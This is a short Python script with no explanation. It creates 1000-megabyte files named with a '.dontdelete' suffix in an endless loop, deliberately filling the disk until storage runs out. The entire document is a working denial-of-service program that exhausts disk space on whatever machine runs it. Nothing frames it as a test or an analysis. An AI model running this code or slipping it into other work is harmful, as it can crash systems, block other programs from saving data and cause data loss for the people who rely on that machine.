name = 0
size = 1000 # megabyte
while True:
    file = open(f'{name}.dontdelete', 'wb')
    file.write(b'0' * 1024 * 1024 * size)
    file.close()
    name += 1
